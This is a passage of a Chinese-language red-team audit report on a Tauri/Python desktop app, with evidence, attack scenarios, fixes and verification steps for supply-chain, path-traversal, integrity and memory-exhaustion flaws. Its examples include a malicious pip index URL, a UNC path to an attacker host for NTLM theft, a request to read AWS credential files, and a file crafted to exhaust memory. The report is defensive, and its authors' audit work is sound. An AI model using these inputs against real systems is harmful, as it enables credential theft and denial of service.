仓库内已提交 `src-tauri/binaries/backend-x86_64-pc-windows-msvc.exe`，**165,625,155 字节**，Git 中无对应 `.sha256` / 签名文件；`scripts/package.ps1:11-14` 构建时直接 `Copy-Item` 覆盖，无校验步骤。

**攻击场景**（威胁 c）

前置条件：攻击者对安装目录**具有写权限**。默认 `installMode=perMachine` → `C:\Program Files\MDescriptor Studio\`，标准用户不可写（这是**现有缓解**）。以下情况使其可达：

1. 便携/自定义安装路径（用户选 `D:\tools\MDS`、`C:\Users\x\Desktop\MDS` 等可写位置）；
2. NSIS 安装目录 ACL 被管理员/其他安装器放宽（常见运维事故）；
3. 应用自带的更新/修复流程以宽松 ACL 重建目录；
4. 攻击者诱导用户"把应用解压到任意目录运行"。

步骤：
1. 攻击者把 `<安装目录>\backend-x86_64-pc-windows-msvc.exe` 替换为自己的载荷（保持原文件名；`main.rs:113` 优先尝试带 triple 的名字，其次 `backend.exe`——两个名字都可用）。
2. 受害者每次启动 MDescriptor Studio，`spawn_backend()`（`main.rs:69`）都会执行该载荷，且因为它仍是 sidecar 的 stdio 协议端点，可以**伪装成正常后端**返回合法 `backend.ready`，长期潜伏。
3. 变体：**DLL 侧载**。`backend.spec` 是 PyInstaller **onefile**（`console=True`），启动时把内含的 `python3XX.dll`、`libscipy_openblas.dll` 等解压到 `%TEMP%\_MEIxxxxxx` 并加载。攻击者若能在 sidecar 同目录放置同名 DLL，在部分加载路径下会被优先解析（`_MEI` 目录由 PyInstaller 在启动时创建，历史上存在 onefile 的临时目录可预测/可植入问题）。

**影响**：以受害者权限的**持久化代码执行**（每次启动触发）；若受害者以管理员身份运行应用则为提权。另：`console=True` 使 sidecar 带一个可见控制台窗口，也是一个（次要的）UI/信息暴露问题。

**已有缓解**：`installMode: "perMachine"`；`Command::new()` 使用**绝对路径**，因此不存在 PATH 搜索顺序劫持。

**修复建议**

1. 在 `main.rs:114-116` 之间加入完整性校验：把 sidecar 的 SHA-256（构建时由 `scripts/package.ps1` 生成并写入 `src-tauri/binaries/backend.sha256`，随发布签名）编译进二进制（`include_str!`），spawn 前计算并比对，不匹配则 `emit("backend-exit")` 并拒绝启动。
2. 更强的做法是校验 **Authenticode 签名**：`WinVerifyTrust` 验证 sidecar 由本产品证书签名，并在被替换/未签名时拒绝执行。Tauri 生态有 `tauri-plugin-*` 之外的现成 Rust crate 可用；也可通过 `windows-rs` 调 `WinVerifyTrust`。
3. `scripts/package.ps1:14` 在 `Copy-Item` 后追加 `Get-FileHash -Algorithm SHA256` 写入校验和文件，并在 CI 中作为发布门禁。
4. 165 MB 二进制不应直接入 Git——改用 Git LFS 或构建产物仓库，并在发布流程中记录哈希；同时把 `*.exe` 的哈希纳入安装器。
5. `backend.spec:66` 的 `console=True` 若非调试必需，可评估改为 `console=False`（注意：本项目依靠 stdio 传协议，`console=False` 在 Windows 上仍保留句柄，需实测）。
6. 安装目录 ACL：在 NSIS 模板中显式收紧（移除 `Users:(M)`），并在应用启动时检测"安装目录对当前用户可写"并弹出警告。

**验证方式**

- 静态：`ls -la src-tauri/binaries/` 确认无校验和文件；`grep -n "installMode\|externalBin" src-tauri/tauri.conf.json`。
- 动态（隔离 VM、把应用装到用户可写目录）：用一个"只往临时文件写一行日志然后 execve 回真 sidecar"的代理程序替换 sidecar（**不要做破坏性替换**，保留原文件备份），启动应用，确认代理被执行。随后恢复原文件。
- 检查安装目录 ACL：`icacls "C:\Program Files\MDescriptor Studio"`。

---

### RT-05 — pip 自更新信任 PyPI 返回的版本号，未固定索引、未校验哈希

- **严重度**：Medium（release 被 `_frozen()` 阻断；dev/非 frozen 环境下为 High/Critical）
- **CWE**：CWE-494（下载代码未做完整性校验）、CWE-829（引入不可信功能）
- **类别**：供应链 / 参数注入
- **置信度**：高（代码路径与缓解条件均已确认）

**证据**

```python
# backend/mdescriptor_studio_backend/services/update_service.py:73-92
def _check(self) -> None:
    req = urllib.request.Request(PYPI_JSON, headers={"User-Agent": "MDescriptorStudio-Backend/0.1"})
    with urllib.request.urlopen(req, timeout=8) as resp:         # <-- 78：无显式 CA/证书固定，无超时重试限制
        data = json.loads(resp.read().decode("utf-8"))           # <-- 79：响应体无大小限制
    latest = str(data["info"]["version"]).strip()                # <-- 80：无任何格式校验
    ...
```

```python
# update_service.py:101-116
process = subprocess.Popen(
    [sys.executable, "-m", "pip", "install", "--upgrade",
     f"mdescriptor=={target_version}",                            # <-- 108：版本号拼进 argv
     "--disable-pip-version-check"],
    ... )   # 注意：参数列表形式，无 shell=True —— 不存在 shell 元字符注入
```

```python
# backend/mdescriptor_studio_backend/main.py:60-66
def engine_update(params):
    snap = updates.snapshot()
    target = (params.get("version") or snap.get("latest"))        # <-- 62：前端可直接指定版本
    if not target:
        raise AppError(INVALID_PARAMS, "no target version — call engine.check_update first")
    job_id = jobs.submit("engine.update", lambda ctx: updates.update_runner(ctx, str(target)))
```

缺失的加固项：**无 `--require-hashes`**、无 `--index-url` 固定、无 `--no-cache-dir`、无 `--only-binary`、无版本格式正则。

**攻击场景**（威胁 b：镜像源/仓库劫持；威胁 c：本机 pip 配置被改）

前置条件（release 下的**现有缓解**）：`_frozen()`（`update_service.py:56-57`）在 PyInstaller 构建中返回 True，`start_check`（62-64 行）与 `update_runner`（96-97 行）都会提前返回 `ENGINE_UPDATE_UNSUPPORTED`。因此**打包后的应用不会发起 pip 自更新**。以下场景仍然可达：

1. **Dev / 源码运行**（`tauri dev` → `main.rs:127-137` 用 `.venv\Scripts\python.exe -m mdescriptor_studio_backend`）：`sys.frozen` 为假，自更新完全可用。开发者机器通常有更高权限、更多凭据，是真实目标。
2. **若将来发布非 frozen 构建**，或 `sys.frozen` 判定被绕过，则本条直接升为 Critical。
3. **即使 pip 不执行**，每次启动都会无条件向 `https://pypi.org/pypi/mdescriptor/json` 发起请求（`main.py:195`），且 `urlopen` 未限制响应体大小、未固定 CA。在企业 MITM 代理（已装根证书）场景下，返回的 `version` 完全由中间人决定。

步骤（dev 场景）：
- 攻击者在 `%APPDATA%\pip\pip.ini` 或环境变量中写入 `PIP_INDEX_URL=http://mirror.attacker/simple`（**非提权即可做到**），或劫持 DNS/内网镜像。
- 受害者点击"更新引擎"→ `pip install --upgrade mdescriptor==<版本>` → pip 从攻击者索引下载包 → **包内的构建后端（`setup.py`/PEP 517 build backend）被执行** → 代码执行。
- 版本号本身也可被用作 argv 注入的尝试面：虽然当前是 argv 列表（无 shell），但 `mdescriptor=={target}` 中若 `target` 含 PEP 508 语法（`;` 标记、`@` 直接引用），pip 的需求解析器会按不同语义处理。当前未做校验，属"未加固"。

**影响**：dev 环境下以开发者权限的任意代码执行；企业内部镜像劫持可批量投毒。

**已有缓解**：`sys.frozen` 检查（release 阻断）；`subprocess.Popen` 使用参数列表而非 `shell=True`（无 shell 注入）；`errors.py:18` 的 `ENGINE_UPDATE_UNSUPPORTED` 让 UI 提示"下载新安装器"。`update_service.py:124-130` 的取消后 `kill()` 是正确的（注释里标为 red-team follow-up）。

**修复建议**（`update_service.py`）

1. 版本号白名单校验（`_check` 第 80 行后、`update_runner` 第 98 行后都要加，因为 `main.py:62` 允许前端直接传）：

```python
_VERSION_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){0,3}(?:[abrc]+\d+)?(?:\.post\d+)?(?:\.dev\d+)?$")
def _safe_version(v: object) -> str:
    s = str(v).strip()
    if not _VERSION_RE.match(s):
        raise AppError(INVALID_PARAMS, f"illegal version string: {s!r}")
    return s
```

2. `update_runner` 的 Popen 增加供应链加固参数（第 101-110 行）：

```python
process = subprocess.Popen(
    [sys.executable, "-m", "pip", "install", "--upgrade",
     f"mdescriptor=={target}",
     "--index-url", "https://pypi.org/simple",   # 固定官方索引，忽略 pip.ini/环境变量
     "--require-hashes",                          # 需配合下面的哈希清单
     "--no-cache-dir",
     "--only-binary=:all:",                       # 禁止执行 sdist 构建后端（!important）
     "--disable-pip-version-check", "--no-input"],
    env=clean_env,   # 见第 3 点
    ...)
```

   > 说明：`--require-hashes` 要求提供 `--hash=sha256:...`，需从受信任清单（随应用发布、带签名）取哈希；若暂不可行，**至少**要加 `--only-binary=:all:` 与固定 `--index-url`，这能阻断"执行包内构建代码"这一最主要的 RCE 路径。

3. 清洗子进程环境，剔除 `PIP_INDEX_URL`、`PIP_EXTRA_INDEX_URL`、`PIP_TRUSTED_HOST`、`PIP_FIND_LINKS`、`PIP_PRE`、`PYTHONPATH`、`PYTHONSTARTUP` 等：

```python
_BLOCK = {"PIP_INDEX_URL","PIP_EXTRA_INDEX_URL","PIP_TRUSTED_HOST","PIP_FIND_LINKS",
          "PIP_NO_INDEX","PIP_PRE","PIP_CACHE_DIR","PYTHONPATH","PYTHONSTARTUP","PYTHONHOME"}
clean_env = {k: v for k, v in os.environ.items() if k.upper() not in _BLOCK}
clean_env.setdefault("PIP_DISABLE_PIP_VERSION_CHECK", "1")
```

4. `_check` 的网络请求加固（第 75-79 行）：显式指定 CA（`ssl.create_default_context(cafile=certifi.where())` 传入 `urlopen(context=...)`），限制响应体（`resp.read(1 << 20)` 最多 1 MB），并校验 `data["info"]["version"]` 格式。
5. 长期：把"引擎更新"从"进程内 pip"改为"下载带签名的 wheel/MSI 到临时目录并校验签名后安装"，或干脆只提示用户下载新安装器（release 已是此行为，建议 dev 也统一）。

**验证方式**

- 静态：`grep -n "require-hashes\|index-url\|only-binary\|frozen" backend/.../update_service.py`。
- 动态（隔离 VM，dev 环境）：
  1. 设 `PIP_INDEX_URL=http://127.0.0.1:8080/simple`（本地假索引），调用 `engine.update`，用抓包/pip 日志确认 pip 确实使用了攻击者可控的索引 → 证明未固定索引。
  2. 调用 `engine.update` 并传 `{"version": "1.2.3; sys_platform == 'win32'"}`、`{"version": "1.0 @ https://attacker/x.whl"}` 等非规范字符串，观察 pip 收到的一手 argv（可在 `update_service.py:100` 的 `ctx.progress` 消息里看到 `pip install mdescriptor==<target>`）→ 证明无格式校验。
  - **不要真的执行完整安装**；看到 argv 即可停止，或用 `job.cancel` 取消。

---

### RT-06 — `dataset.register` 任意路径解析（`format` 可绕过扩展名检查）+ 错误信息泄露

- **严重度**：Medium
- **CWE**：CWE-22、CWE-209（错误信息含过多信息）、CWE-73
- **类别**：路径遍历 / 信息泄露
- **置信度**：高（任意路径被打开解析已确证）；"通过错误消息完整外泄文件内容"这一子项**未确证**，见下

**证据**

```python
# backend/mdescriptor_studio_backend/services/dataset_service.py:128-140
raw_path = params.get("path")
if not raw_path or not isinstance(raw_path, str):
    raise AppError(INVALID_PARAMS, "'path' (string) is required")
path = Path(raw_path)
if not path.exists():                                   # <-- 133：唯一校验
    raise AppError(INVALID_DATASET, f"path does not exist: {path}")   # <-- 134：路径回显
try:
    fmt = params.get("format") or detect_format(path)   # <-- 136：format 由调用方指定
except AppError:
    raise
```

```python
# datasets/base.py:58-84
def detect_format(path: Path) -> str:
    if path.is_dir():
        ...
    if path.is_file() and path.suffix.lower() in (".xyz", ".extxyz"):   # <-- 69：扩展名白名单
        return "extxyz"
    raise AppError(UNSUPPORTED_FORMAT, f"unsupported dataset path: {path}")   # <-- 存在性 oracle + 路径回显

def create_adapter(path: Path, fmt: str | None = None) -> DatasetAdapter:
    path = Path(path)
    fmt = fmt or detect_format(path)          # <-- 79：给了 fmt 就完全跳过扩展名检查
    if fmt == "deepmd": return DeepMDAdapter(path)
    if fmt == "extxyz": return ExtXYZAdapter(path)
```

```python
# datasets/extxyz.py:32-52（_build_index 打开任意路径并逐行读）
with open(self.source_path, "r", encoding="utf-8", errors="replace") as f:   # <-- 32
    while True:
        start = f.tell()
        line = f.readline()
        ...
        natoms = int(line.strip())       # <-- 39：文件首行直接当整数
        ...
        for _ in range(natoms):
            if not f.readline(): break   # <-- 49：文件不够长就静默 break，索引仍能建成功
```

```python
# datasets/extxyz.py:104-122（get_frame）
if len(tokens) < n_cols:
    raise AppError(INVALID_DATASET, f"frame {index} row {row}: truncated")
try:
    ...
    positions[row] = [float(tokens[pos_i]), ...]
except (ValueError, IndexError) as exc:
    raise AppError(
        INVALID_DATASET, f"frame {index} row {row}: malformed atom line ({exc})"   # <-- 121：异常文本进入 IPC
    ) from exc
```

```python
# datasets/fingerprint.py:13
files = sorted(path.rglob("*")) if path.is_dir() else [path]   # 对任意目录递归枚举
```

```python
# protocol/server.py:72-76（未捕获异常的文本原样回传 webview）
except Exception as exc:
    log.exception("unhandled error in %s", method)
    self._write(frames.response_err(vid, AppError("INTERNAL_ERROR", f"{type(exc).__name__}: {exc}")))
```

**攻击场景**（威胁 b/d + c）

前置条件：webview 内代码执行（同 RT-03）。

1. **存在性/元数据探测**：循环调用 `dataset.register` 传不同 `path`，从错误消息区分"不存在" / "不支持的格式" / "不是文件" / 各种解析失败 → 得到受害者文件系统上任意路径的存在性与类型。`format="deepmd"` 时 `DeepMDAdapter.__init__`（`deepmd.py:31-36`）会 `path.glob("set.*")`，错误消息 `f"no DeepMD frames found (...): {path}"` 回显完整路径。成功注册后，`_meta()` → `compute_fingerprint()` 会把该路径的**文件大小与 mtime** 通过 `dataset.list` 返回给前端。
2. **绕过扩展名检查读取任意文件**：传 `{"path":"C:\\Users\\victim\\.aws\\credentials","format":"extxyz"}` → `create_adapter` 跳过 `detect_format` → `ExtXYZAdapter` 直接 `open()` 并逐行解析该文件（内容被当作 extxyz 文本）。
3. **错误消息外泄（部分确证）**：解析失败时，`extxyz.py:121` 把 `float()` 的原始异常文本放进消息，形如 `could not convert string to float: '<token>'`。`deepmd.py:46` 把 dpdata 的异常（`f"invalid DeepMD dataset ({type(exc).__name__}): {exc}"`）原样回传。这些都会经 `server.py:75` 到达 webview。
   - **限制（必须说明）**：`dataset.frame` 需要一条 DB 记录，而记录只在 `register` 的 job 成功（scan + `compute_statistics` 全通过）后才写入（`dataset_service.py:185-203`）。因此"注册任意文件 → 立刻调 `dataset.frame` 读取错误"这条路**通常走不通**；只有当目标文件内容恰好能作为合法 extxyz/deepmd 通过统计阶段时才能注册成功。可行的变体是"先注册一个合法数据集，之后该文件在磁盘上被替换"——但那需要攻击者本来就能写该文件。所以**"完整的任意文件内容外泄"我标为未确证**，请蓝队在复现环境验证。
4. **UNC / 凭据外泄**：`path = "\\\\attacker.tld\\share\\x.xyz"` → `path.exists()` 与后续 `open()` 触发 SMB 认证 → NTLM 哈希外泄（与 RT-02 同源，但这里只需一次 `dataset.register`）。
5. **资源/阻塞**：`path.exists()` / `open()` 对网络路径、可移动介质、命名管道可能长时间阻塞；`fingerprint.py:13` 的 `path.rglob("*")` 对任意大目录递归枚举。

**影响**：任意路径存在性/大小/mtime 探测；任意文件被打开解析（内容经错误消息部分外泄，程度待蓝队确认）；UNC 触发的 NTLM 凭据外泄；通过指向大文件/网络路径造成 worker 线程阻塞。

**已有缓解**：`dataset_service.py:130` 的类型检查；`detect_format` 的扩展名白名单（**但被 `format` 参数绕过**）；`database.py:18` 的 `source_path UNIQUE` 约束防止重复注册（不是安全控制）。

**修复建议**（`dataset_service.py:128-142`）

```python
_ALLOWED_ROOTS: list[Path] | None = None   # 由配置注入：用户显式选过的目录

def _safe_source_path(raw: str) -> Path:
    if raw.startswith("\\\\") or raw.startswith("//") or raw.startswith("\\\\?\\") or raw.startswith("\\\\.\\"):
        raise AppError(INVALID_DATASET, "UNC/device paths are not allowed")
    if ":" in raw[2:] or "::$" in raw.upper():
        raise AppError(INVALID_DATASET, "alternate data streams are not allowed")
    p = Path(os.path.expanduser(raw))
    if not p.is_absolute():
        raise AppError(INVALID_DATASET, "dataset path must be absolute")
    resolved = p.resolve(strict=False)
    if ".." in resolved.parts:
        raise AppError(INVALID_DATASET, "dataset path must not contain '..'")
    if resolved.is_symlink():
        raise AppError(INVALID_DATASET, "dataset path must not be a symlink")
    if _ALLOWED_ROOTS is not None and not any(
        str(resolved).lower().startswith(str(r.resolve()).lower() + os.sep) for r in _ALLOWED_ROOTS
    ):
        raise AppError(INVALID_DATASET, "dataset path is outside the allowed roots")
    # 必须存在且是常规文件或目录
    if not resolved.exists() or (not resolved.is_file() and not resolved.is_dir()):
        raise AppError(INVALID_DATASET, "dataset path does not exist")
    return resolved
```

配套：
- **去掉 `format` 参数**：`dataset_service.py:136` 改为 `fmt = detect_format(path)`，不再信任调用方。若确实需要（例如 `.txt` 扩展名的 extxyz 文件），则把 `format` 限制为 `{"extxyz","deepmd"}` 且**仍然**要求扩展名在白名单 `{".xyz",".extxyz"}` 内（deepmd 要求目录含 `type.raw` + `set.*/coord.npy`）。
- `base.py:69` 的扩展名白名单保留，并在 `create_adapter` 里对 `fmt` 做枚举校验（当前第 80-84 行未知 fmt 会抛错，OK，但要防止 fmt 绕过检测）。
- **错误消息脱敏**：`dataset_service.py:134`、`base.py:67,71`、`deepmd.py:35,46,85`、`extxyz.py:52,92,104,121` 一律不要回显完整路径与第三方异常文本；改为回显 `path.name`（或不回显），异常细节只写 `log.exception`。`server.py:75` 的通用兜底也不要把 `str(exc)` 直接发给前端，改为返回 `INTERNAL_ERROR` + 一个可关联的 `error_id`，细节只进日志。
- `dataset.frame` 的 `index` 参数（`dataset_service.py:378`）加上 `not isinstance(index, bool)`，避免 `true` 被当作 1。
- 给 `open()`/`rglob()` 加上超时/规模上限：例如 `fingerprint.py:13` 限制 `rglob` 枚举条目数（如 50 万）并对总字节数设上限。

**验证方式**

- 静态：`grep -n "format\b" backend/.../services/dataset_service.py` 与 `grep -n "detect_format\|create_adapter" backend/.../datasets/base.py`。
- 动态（dev，临时 `MDS_DATA_DIR`）：调用 `dataset.register {"path":"C:\\Windows\\win.ini","format":"extxyz"}` 观察错误消息是否回显路径与解析细节；再试 `{"path":"C:\\Windows\\System32\\config\\SAM","format":"extxyz"}` 观察"No such file"与"Permission denied"的区分 → 存在性/权限 oracle。
- UNC 场景同 RT-02（隔离网络 + SMB 监听）。
- 只做只读注册尝试，不要注册真实大目录。

---

### RT-07 — 数据集指纹只哈希 size+mtime，不含内容 → 完整性/STALE 保护可绕过

- **严重度**：Medium
- **CWE**：CWE-354（校验值不足）、CWE-345
- **类别**：数据完整性
- **置信度**：高

**证据**

```python
# backend/mdescriptor_studio_backend/datasets/fingerprint.py:9-22
def compute_fingerprint(source_path: Path, number_of_frames: int | None = None) -> str:
    path = Path(source_path)
    h = hashlib.sha256()
    h.update(str(path).encode("utf-8"))
    files = sorted(path.rglob("*")) if path.is_dir() else [path]
    for f in files:
        if f.is_file():
            stat = f.stat()
            h.update(f.relative_to(...).as_posix().encode())
            h.update(str(stat.st_size).encode())      # <-- 18：只有大小
            h.update(str(stat.st_mtime_ns).encode())  # <-- 19：只有修改时间
    if number_of_frames is not None:
        h.update(str(number_of_frames).encode())
    return h.hexdigest()
```

**没有任何一个字节的内容进入哈希。**

三个关键消费点：

```python
# dataset_service.py:270-283（_cached_stats）：指纹相同 → 直接复用缓存的统计结果
current = compute_fingerprint(Path(row["source_path"]), row["number_of_frames"])
if stats_row is None or stats_row["fingerprint"] != current:
    return None
stats = json.loads(stats_row["stats_json"])
```

```python
# analysis_service.py:944-955（_assert_dataset_current）：指纹相同 → 不标记为 STALE
current = compute_fingerprint(Path(dataset["source_path"]), dataset["number_of_frames"])
if current != dataset["fingerprint"]:
    self._mark_stale(...); raise AppError(ANALYSIS_STALE, ...)
```

```python
# descriptor_service.py:179-193：指纹是 descriptor 结果缓存键的核心组成部分
fingerprint = compute_fingerprint(Path(row["source_path"]), row["number_of_frames"])
cache_key = hashlib.sha256("\x1f".join([fingerprint, name, canonical, ...]).encode()).hexdigest()
```

**攻击场景**（威胁 a：共享的被污染数据集；威胁 c：同机恶意软件）

前置条件：攻击者对数据集文件**具有写权限**。Windows 上同一用户（或对该文件有写权限的任何主体）在修改文件后可用 `SetFileTime` 把 mtime 恢复到原值，并保持文件大小不变。

1. 受害者 A 注册并计算了数据集 D 的描述符与统计（指纹 F 入库）。
2. 攻击者修改 D 的内容（例如把坐标/能量改成错误值、或植入导致下游算法给出特定结论的结构），然后**把文件大小与 mtime 恢复原样**（保持 size 相同需等长替换，或用 padding；extxyz/deepmd 都容易做到等长替换）。
3. 受害者再次打开应用：`compute_fingerprint` 返回同一个 F：
   - `dataset.list` 显示 `cache_valid = true`；
   - `dataset.statistics` 直接复用**旧内容的统计结果**；
   - `_assert_dataset_current` 判定"数据集未变"，历史 descriptor 结果**不被标记 STALE**，可以继续作为新分析的输入；
   - `descriptor.submit` 命中缓存键，直接返回**基于旧内容算出的** `values.npy`。
4. 结果：UI 完全无提示，用户基于被篡改的数据得出错误的科学结论。

**影响**：数据完整性破坏（科研结论被静默污染）。这是"完整性"而非"机密性/可用性"问题，但对本产品（材料科学分析工具）是核心危害。附带效果：攻击者可以让"数据集已变更"的检测**失效**，从而绕过 STALE 保护。

**已有缓解**：无。代码注释（`dataset_service.py:93-96`）显示设计者把指纹当作内容变更的检测手段，但实现只覆盖元数据。

**修复建议**（`datasets/fingerprint.py:9-22`）

在指纹中加入内容摘要。为兼顾大文件性能，采用"采样 + 全量大小"策略：

```python
_SAMPLE = 1 << 20  # 1 MiB

def _file_digest(f: Path, h) -> None:
    size = f.stat().st_size
    h.update(str(size).encode())
    with f.open("rb") as fh:
        if size <= 4 * _SAMPLE:
            for chunk in iter(lambda: fh.read(_SAMPLE), b""):
                h.update(chunk)
        else:
            h.update(fh.read(_SAMPLE))                    # 头
            fh.seek(size // 2 - _SAMPLE // 2); h.update(fh.read(_SAMPLE))  # 中
            fh.seek(max(0, size - _SAMPLE));  h.update(fh.read(_SAMPLE))   # 尾
```

要点：
- 仍保留 mtime（便宜的快路径），但**不能只靠它**；
- 对每个文件哈希"大小 + 头/中/尾各 1 MiB"（>4 MiB 的文件）或全量（≤4 MiB）；
- 目录场景下 `rglob` 需同时哈希**文件相对路径列表本身**（当前第 17 行只哈希了单个文件的相对名，等于把列表隐式折叠进循环，但目录为空时不更新——可接受）；
- 拒绝在指纹计算中跟随符号链接（`f.is_file()` 跟随链接，若目录内被放入指向他处的链接会把无关文件纳入哈希并泄露其 size/mtime）：改为 `f.is_symlink()` 时跳过或拒绝该数据集。

配套：在 `dataset_service.py:_meta`（90-111）与 `refresh_if_changed`（348-356）中，把"指纹相同"语义从"内容未变"降级描述为"元数据未变"，不要让 UI 显示 `cache_valid=true` 来暗示内容一致。

**验证方式**

- 静态：`cat backend/mdescriptor_studio_backend/datasets/fingerprint.py`（全文 22 行，确认无 `read()`/`update(chunk)`）。
- 动态（临时 `MDS_DATA_DIR`）：
  1. 写一个合法 extxyz 文件，注册并等待 job 完成，记录 `dataset.get` 返回的 `fingerprint` 与 `stats`。
  2. 用**等长**替换修改坐标（保持字节数不变），再用 `os.utime(path, ns=(atime, mtime_ns))` 把 mtime_ns 恢复成原值。
  3. 重新调用 `dataset.get` / `dataset.statistics` → 若指纹未变且统计被复用，问题成立。
  - 全部操作在临时目录内的副本上进行。

---

### RT-08 — extxyz `natoms` 无上限 + 全量帧载入内存 → 恶意数据集 OOM DoS

- **严重度**：Medium
- **CWE**：CWE-789（无约束的内存分配）、CWE-400
- **类别**：资源耗尽 / DoS
- **置信度**：高

**证据**

```python
# datasets/extxyz.py:38-47（_build_index）
try:
    natoms = int(line.strip())      # <-- 39：文件首行直接当整数，无上限、无与文件大小的一致性校验
except ValueError:
    break
comment = f.readline()
if not comment: break
meta = _parse_comment(comment)
self._offsets.append(start)
self._frame_meta.append({"natoms": natoms, **meta})   # <-- 47：巨大的 natoms 被存进索引
for _ in range(natoms):
    if not f.readline(): break      # <-- 49：文件不够长就 break —— 索引照样建成功
```

```python
# datasets/extxyz.py:99-100（get_frame）
positions = np.empty((natoms, 3), dtype=np.float64)                     # <-- 99：先分配，后读取
forces = np.empty((natoms, 3), dtype=np.float64) if forces_i is not None else None
```

关键点：`_build_index` 因为第 49 行的 `break` 会**在几毫秒内成功完成**（只读到 EOF），于是这个数据集通过了 `register` 的 scan 阶段；随后任何一次 `get_frame(0)` 才触发 `np.empty((natoms, 3))`。

其他放大器：

```python
# services/descriptor_service.py:333-343
adapter = self.datasets._adapter_for(row)
frames = []
total = max(len(adapter), 1)
for i, frame in enumerate(adapter.iter_frames()):   # <-- 336：把整个数据集全部帧载入内存
    frames.append(frame)
...
batch = self.adapter.to_structure_batch(frames)     # <-- 343：再 concat 一份
```

```python
# datasets/deepmd.py:8-9, 49（文档字符串与实现）
"""... The whole system is loaded eagerly into memory at construction — the old
memmap lazy path is gone (documented trade-off of ADR-19)."""
data = system.data        # <-- 49：dpdata 全量载入
```

```python
# datasets/extxyz.py:167-168（Properties 列尺寸同样由文件决定）
parts = value.split(":")
for i in range(0, len(parts), 3):
    cols.append((parts[i], int(parts[i + 2])))     # <-- 168：列宽未校验
```

**攻击场景**（威胁 a：用户间共享的恶意/损坏数据集文件）

前置条件：受害者导入一个攻击者提供的 `.xyz`/`.extxyz` 文件或 DeepMD 目录。这是本产品**最自然的威胁模型**（用户之间共享数据集文件）。无需任何本机权限。

1. 攻击者构造一个几十字节的文件：
   ```
   2000000000
   Lattice="5 0 0 0 5 0 0 0 5" Properties=species:S:1:pos:R:3 energy=-1.0 pbc="T T T"
   ```
   文件只有 2 行，但首行声明 20 亿个原子。
2. `_build_index`：读到首行 `natoms=2000000000`，读注释行，加入索引，然后 `for _ in range(2e9)` 立刻 `break` → 索引建成，1 帧。
3. `register` 的 job 继续 → `compute_statistics` → `iter_frames` → `get_frame(0)` → `np.empty((2e9, 3))` = **48 GB** 分配请求 → `MemoryError` 或触发系统级内存/页文件耗尽。
4. 即使被 OOM killer 或 `MemoryError` 拦下，`dataset.register` 是 job 线程（`job_service.py:86` 只开了 2 个 worker），重复导入几次即可把两个 job worker 全部占死；配合 RT-09（RPC 池无界）可让后端完全不可响应。
5. 另一条路径：合法的超大 natoms（例如 1e7）配合 `descriptor_service.py:336-343` 的全量载入 → `to_structure_batch` 里 `np.concatenate` 再复制一份 → 内存翻倍。

**影响**：后端进程 OOM 崩溃或整机内存压力；job worker 被长期占用导致功能不可用。无提权、无数据泄露，因此定 Medium。

**已有缓解**：`mdescriptor_adapter.py:196-197` 把 `MemoryError` 映射为 `OUT_OF_MEMORY`（但只在 descriptor compute 路径上生效，且只是错误映射不是防护）；`extxyz.py:104` 的 `len(tokens) < n_cols` 截断检查（在分配之后才生效）；`periodic_boundary_ghosts`（`dataset_service.py:454-515`）已有 `max_ghosts=3000` 上限与 `chunk` 分块——这个函数是**做得对的**，可作为其他地方的参照。

**修复建议**

1. `extxyz.py:39` 之后加原子数与文件规模的一致性校验：

```python
MAX_ATOMS_PER_FRAME = 1_000_000
...
natoms = int(line.strip())
if natoms < 0 or natoms > MAX_ATOMS_PER_FRAME:
    break   # 或 raise AppError(INVALID_DATASET, ...)
file_size = self.source_path.stat().st_size
# 每行至少 ~16 字节，剩余文件必须能容纳 natoms 行，否则视为损坏
if natoms > 0 and file_size - f.tell() < natoms * 8:
    raise AppError(INVALID_DATASET, f"frame declares {natoms} atoms but the file is too small")
```

2. `extxyz.py:99` 分配前估算字节数并与进程可用内存配额比较：

```python
_NEEDED = natoms * 3 * 8
if _NEEDED > MAX_FRAME_BYTES:      # 例如 512 MiB
    raise AppError(INVALID_DATASET, f"frame too large: {natoms} atoms ({_NEEDED} bytes)")
```

3. `extxyz.py:167-168` 校验列尺寸：`size` 必须是 1..64 的整数，且所有列宽之和不超过（例如）256；否则拒绝。
4. `descriptor_service.py:333-343` 改为**流式/分块**：按累计原子数或累计字节数分批（例如每批 ≤ 200 MB）调用 `to_structure_batch` + `compute`，把结果 `np.save` 追加到临时文件后拼接，避免一次性持有整份数据。至少应加一个"数据集总字节数超过阈值时要求用户确认"的前置检查。
5. 给 job worker 加内存护栏：在 `_run_compute` 开头读取可用物理内存（`psapi.GlobalMemoryStatusEx`，`descriptor_service.py:39-72` 已有 RSS 采样代码可复用），若预计占用超过阈值则直接拒绝并给出明确错误。
6. 考虑恢复 DeepMD 的 memmap 惰性路径，或至少在 `deepmd.py:49` 之前检查 `type.raw` 行数 × `coord.npy` 形状估算出的总字节数是否超过配额。

**验证方式**

- 静态：`sed -n '30,60p;95,110p' backend/.../datasets/extxyz.py`。
- 动态（临时 `MDS_DATA_DIR`，隔离 VM 且设置内存上限）：用上面那个 2 行文件调用 `dataset.register`，观察后端进程内存曲线与最终 job 状态。为安全起见，先把 `natoms` 设成 `50_000_000`（1.2 GB）观察分配成功，再逐步加大；**不要在生产机上直接试 2e9**。
- 观察 `job.get` 返回的错误码是否为 `INTERNAL_ERROR`（说明 MemoryError 未被优雅处理）以及 `dataset.get` 是否留下僵尸 RUNNING 行。

---

### RT-09 — RPC 线程池任务队列无界 → 内存放大 DoS

- **严重度**：Medium
- **CWE**：CWE-770（无限制地分配资源）、CWE-400
- **类别**：资源耗尽
- **置信度**：高

**证据**

```python
# protocol/server.py:21-26
def __init__(self, methods: dict, on_stop=None):
    self._write_lock = threading.Lock()
    self._pool = ThreadPoolExecutor(max_workers=4, thread_name_prefix="rpc")   # <-- 25
    self._closed = threading.Event()
```

```python
# protocol/server.py:39-47
def serve_forever(self) -> None:
    for raw in sys.stdin:
        line = raw.strip()
        if not line: continue
        if self._closed.is_set(): break
        self._pool.submit(self._handle, line)    # <-- 47：无界队列，无背压、无并发上限
```

```python
# protocol/frames.py:10, 18
MAX_LINE_BYTES = 8 * 1024 * 1024
...
if len(line.encode("utf-8", "replace")) > MAX_LINE_BYTES:
    raise AppError(INVALID_PARAMS, "frame exceeds 8 MB limit")
```

8 MB 的行限制**本身是有效的**（`len()` 在解析前检查，无法绕过；`server.py:42` 的 `raw.strip()` 只会缩短字符串）。问题在于**它没有约束排队中的任务总数**：`ThreadPoolExecutor` 内部队列无界，提交速度远快于 4 个 worker 的消费速度，队列会无限增长。

输出侧同样无背压：

```rust
